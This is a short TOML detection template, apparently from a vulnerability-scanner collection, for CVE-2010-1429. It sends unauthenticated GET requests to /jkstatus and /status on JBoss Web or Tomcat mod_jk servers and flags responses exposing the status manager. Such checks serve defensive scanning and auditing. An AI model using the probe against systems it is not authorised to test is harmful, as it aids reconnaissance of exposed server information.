[info]
author = "AVE"
description = "检测 JBoss Web/Apache Tomcat mod_jk StatusManagerServlet 信息泄露漏洞，未经认证访问 /jkstatus 或 /status 路径可获取服务器敏感信息"
id = "POC-AVE-2010-0031"
name = "CVE-2010-1429 PoC"
severity = "medium"
tags = [
    "cve-2010-1429",
    "ave-2010-0031",
]
vuln_id = [
    "CVE-2010-1429",
    "AVE-2010-0031",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/jkstatus"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "JK StatusManager",
    "JkStatus",
    "XmlStatus",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/status"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "JK StatusManager",
    "JkStatus",
    "XmlStatus",
]
